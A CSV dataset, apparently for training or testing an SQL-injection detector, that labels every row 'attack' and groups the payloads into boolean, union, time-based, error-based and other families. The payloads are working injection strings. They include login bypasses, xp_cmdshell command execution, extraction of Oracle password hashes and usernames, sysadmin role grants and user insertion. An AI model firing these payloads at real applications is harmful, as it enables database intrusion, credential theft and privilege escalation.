label,payload,family
attack,", exec master..xp_cmdshell 'ping 10.10.1.2'--",other
attack,admin' or '1'  =  '1'--,boolean
attack,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",time
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",error
attack," select * from users where id  =  1 <@<@ union select version  (    )  ,version  (    )   -- 1",union
attack," select * from users where id  =  1 or 1#""$ union select null,version  (    )   -- 1",union
attack,""";waitfor delay '0:0:__TIME__'--",time
attack,select * from users where id  =  '1' *$ 1 or 1  =  1 -- 1',boolean
attack," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",union
attack," select * from users where id  =  1 or ""?@"" or 1  =  1 -- 1",boolean
attack,’ or ‘1’  =  ’1,boolean
attack," select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'",union
attack,admin'or 1  =  1 or ''  =  ',boolean
attack," select * from users where id  =  '1' or !<1 union select 1,version  (    )   -- 1'",union
attack," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",boolean
attack," select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or \.<   =  1 union select 1,@@VERSION -- 1",union
attack,select * from users where id  =  1 + $+%1 or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1.  union select version  (    )  ,version  (    )   -- 1",union
attack," select * from users where id  =  '1' + @ @1 union select 1,version  (    )   -- 1'",union
attack," select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",union
attack," select * from users where id  =  11||1 union select 1,banner from v$version where rownum  =  1 -- 1",union
attack," select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",union
attack,"""   )    )    or pg_sleep  (  __TIME__  )  --",time
attack,||'6,other
attack,^',other
attack,or 'text'   =   n'text',boolean
attack," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",union
attack," select * from users where id  =  '1' union select $ _,@@VERSION -- 1'",union
attack," select * from users where id  =  1 or ""{1""  =  1 or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""{,""  =  1 or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or 1#""? union select 'a',version  (    )   -- 1",union
attack,password:*/  =  1--,other
attack," select * from users where id  =  1 <@. union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 or ""  )  @"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",union
attack," select * from users where id  =  1 or ""  )  {"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1.<@. union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 +\. union select null,@@VERSION -- 1",union
attack," select * from users where id  =  1 + @<@. union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 or \<$ union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  1 +   (  \+  )   union select null,@@VERSION -- 1",union
attack," select * from users where id  =  1. union select null,version  (    )   -- 1",union
attack," select * from users where id  =  1 or ""  )  ["" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or \.<1 union select 1,@@VERSION -- 1",union
attack, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT banner FROM v$version WHERE ROWNUM  =  1   )    )    AND 'i'  =  'i,error
attack,select * from users where id  =  1 <@$_ or 1  =  1 -- 1,boolean
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",error
attack," select * from users where id  =  1 or $+<$ union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  1 or ""@%"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""%,"" or 1  =  1 -- 1",boolean
attack,asc,other
attack," || myappadmin.adduser  (  'admin', 'newpass'  )   || '",other
attack,"exec sp_addsrvrolemember 'name' , 'sysadmin'",other
attack,  )   or true--,boolean
attack, or userid like '%,boolean
attack,/,other
attack,select * from users where id  =  1 or $<\ or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1.  union select 1,version  (    )   -- 1",union
attack," )  ,waitfor delay '0:0:__TIME__'--",time
attack," select * from users where id  =  1 union select @<@.,version  (    )   -- 1",union
attack," select * from users where id  =  1 or ""._"" or 1  =  1 -- 1",boolean
attack,"admin"" or ""1""  =  ""1",boolean
attack, union   (  select @@version  )   --,other
attack, or ''^',other
attack,"""   )    )    or sleep  (  __TIME__  )    =  """,time
attack," select * from users where id  =  1 or \+<\ union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  1 union select @ _,version  (    )   -- 1",union
attack,select * from users where id  =  1 +   (  $+  )   or 1  =  1 -- 1,boolean
attack,select * from users where id  =  '1' <@$_ or 1  =  1 -- 1',boolean
attack," select * from users where id  =  1 +$ 1 union select null,@@VERSION -- 1",union
attack," select * from users where id  =  1 or ""  (  &"" or 1  =  1 -- 1",boolean
attack,select name from syscolumns where id   =     (  sele ...,other
attack," select * from users where id  =  1 or ""1,"" or 1  =  1 -- 1",boolean
attack,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 5  )   waitfor delay '0:0:2' --",time
attack," select * from users where id  =  '1' + @<@# union select 1,version  (    )   -- 1'",union
attack,union all select @@version--,union
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",error
attack,t'exec master..xp_cmdshell 'nslookup www.google.com'--,other
attack,""" or isNULL  (  1/0  )   /*",boolean
attack," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",union
attack," select * from users where id  =  1 or ""{?"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""{#"" or 1  =  1 -- 1",boolean
attack,"admin"" or 1  =  1/*",boolean
attack," select * from users where id  =  1<@<@ union select 1,version  (    )   -- 1",union
attack,declare @s varchar   (  8000  )   select @s   =   0x73656c ...,other
attack," select * from users where id  =  '1' union select +\#,@@VERSION -- 1'",union
attack," select * from users where id  =  1. union select 1,banner from v$version where rownum  =  1 -- 1",union
attack," select * from users where id  =  1 or "".;"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 union select 1 1a,version  (    )   -- 1",union
attack,", begin declare @var varchar  (  8000  )   set @var  =  ':' select @var  =  @var+'+login+'/'+password+' ' from users where login >",other
attack,hi' or 1  =  1 --,boolean
attack,select * from users where id  =  1 %  (  $  )   or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or ""{  )  "" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or 1#""1 union select 1,version  (    )   -- 1",union
attack,select * from users where id  =  1 + \+%\ or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 -@<@ union select version  (    )  ,version  (    )   -- 1",union
attack," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",union
attack," select * from users where id  =  1 or ""]."" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""_;"" or 1  =  1 -- 1",boolean
attack,"insert into users  (  login, password, level  )   values  (   char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )   + char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )  ,char  (  0x64  )  ",other
attack," select * from users where id  =  1 or ""  )    (  ""  =  1 or 1  =  1 -- 1",boolean
attack,"admin"" or ""1""  =  ""1""#",boolean
attack,admin'  )   or '1'  =  '1,boolean
attack,""" or sleep  (  __TIME__  )  #",time
attack," select * from users where id  =  1 or ""?%"" or 1  =  1 -- 1",boolean
attack,select * from users where id  =  '1' + $+%$ or 1  =  1 -- 1',boolean
attack," select * from users where id  =  '1' union select \.#,@@VERSION -- 1'",union
attack,admin'  )   or '1'  =  '1'/*,boolean
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",error
attack," select * from users where id  =  1 or ""@?"" or 1  =  1 -- 1",boolean
attack,select * from users where id  =  1 <@$ or 1  =  1 -- 1,boolean
attack,x' or 1  =  1 or 'x'  =  'y,boolean
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",error
attack," select * from users where id  =  1 union select 1 $,version  (    )   -- 1",union
attack,  )   or   (  'x'  )    =    (  'x,boolean
attack," select * from users where id  =  1 or 1#""  (   union select version  (    )  ,version  (    )   -- 1",union
attack," select * from users where id  =  1 +$+ union select null,@@VERSION -- 1",union
attack," select * from users where id  =  '1' union select \.,@@VERSION -- 1'",union
attack," select * from users where id  =  1 or 1#""@ union select null,version  (    )   -- 1",union
attack," select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",union
attack," select * from users where id  =  1 +1<@ union select null,version  (    )   -- 1",union
attack, )    )    or sleep  (  __TIME__  )    =  ',time
attack,having 1  =  1--,other
attack,!,other
attack,select * from users where id  =  1 or $ 1  =  1 or 1  =  1 -- 1,boolean
attack," select * from users where id  =  '1' or @ 1  =  1 union select 1,version  (    )   -- 1'",union
attack," select * from users where id  =  1 or 1#""; union select 1,version  (    )   -- 1",union
attack,or '1'  =  '1'--,boolean
attack," select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",union
attack," select * from users where id  =  1 or 1#"".  =  1 union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 or @#""{  =  1 union select 1,version  (    )   -- 1",union
attack, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  USERNAME   )    )    FROM SYS.ALL_USERS   )    )    AND 'i'  =  'i,error
attack,sqlvuln,other
attack," select * from users where id  =  1 or "".{"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or 1#""; union select 'a',version  (    )   -- 1",union
attack," select * from users where id  =  1 union select 1 1$,version  (    )   -- 1",union
attack,declare @s varchar   (  8000  )   select @s   =   0x73656c65637420404076657273696f6e,other
attack, or ''&',other
attack," select * from users where id  =  1 or ""?_"" or 1  =  1 -- 1",boolean
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",error
attack," select * from users where id  =  '1' union select \.%1,@@VERSION -- 1'",union
attack," select * from users where id  =  1 or 1#""$ union select version  (    )  ,version  (    )   -- 1",union
attack,declare @q nvarchar   (  4000  )   select @q   = ,other
attack," select * from users where id  =  1.&&@ union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 or ""@  (  "" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 + @<@# union select null,version  (    )   -- 1",union
attack," select * from users where id  =  1 or ""  (  1"" or 1  =  1 -- 1",boolean
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",error
attack," select * from users where id  =  1 union select 1a,banner from v$version where rownum  =  1 -- 1",union
attack," select * from users where id  =  1 + @<1# union select 1,version  (    )   -- 1",union
attack,admin'  )   or   (  '1'  =  '1'#,boolean
attack,select * from users where id  =  '1' or !<@ or 1  =  1 -- 1',boolean
attack,", or '1'  =  '1'",boolean
attack,declare @q nvarchar   (  200  )   0x730065006c00650063007400200040004000760065007200730069006f006e00 exec  (  @q  ) ,other
attack,"admin"" #",other
attack,select * from users where id  =  1 %  (  1  )   or 1  =  1 -- 1,boolean
attack," select * from users where id  =  '1' or \<   =  1 union select 1,@@VERSION -- 1'",union
attack," select * from users where id  =  1 or @#""  (    =  1 or 1  =  1 -- 1",boolean
attack,", begin declare @var varchar  (  8000  )   set @var  =  ' ...",other
attack,select * from users where id  =  1 + \+%$ or 1  =  1 -- 1,boolean
attack, )   or pg_sleep  (  __TIME__  )  --,time
attack,PRINT @@variable,other
attack," select * from users where id  =  1 or @#"".  =  1 or 1  =  1 -- 1",boolean
attack,or a  =  a--,boolean
attack, or 'x'  =  'x,boolean
attack," select * from users where id  =  1 or ""1{"" or 1  =  1 -- 1",boolean
attack,"a' or 1  =  1, --",boolean
attack," select * from users where id  =  '1' or $<\ union select 1,@@VERSION -- 1'",union
attack,select * from users where id  =  1 %  (  \  )   or 1  =  1 -- 1,boolean
attack,""" or """"-""",other
attack," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  1 or 1#""1 union select null,version  (    )   -- 1",union
attack," select * from users where id  =  '1' union select 1,banner from v$version where rownum  =  1 -- 1'",union
attack,"""  )   or   (  ""x""  )    =    (  ""x",boolean
attack,23 OR 1  =  1,boolean
attack," select * from users where id  =  '1' or @  (  1  )    =  1 union select 1,version  (    )   -- 1'",union
attack,select * from users where id  =  1.<@$ or 1  =  1 -- 1,boolean
attack,select * from users where id  =  '1' <@&@ or 1  =  1 -- 1',boolean
attack," select * from users where id  =  1 or "";{"" or 1  =  1 -- 1",boolean
attack,"||  (  elt  (  -3+5,bin  (  15  )  ,ord  (  10  )  ,hex  (  char  (  45   )    )      )    )   ",other
attack, or uname like '%,boolean
attack," select * from users where id  =  1 +   (  $+  )   union select null,@@VERSION -- 1",union
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",error
attack," select * from users where id  =  '1' union select +\,@@VERSION -- 1'",union
attack," select * from users where id  =  1 or ""  (  ;"" or 1  =  1 -- 1",boolean
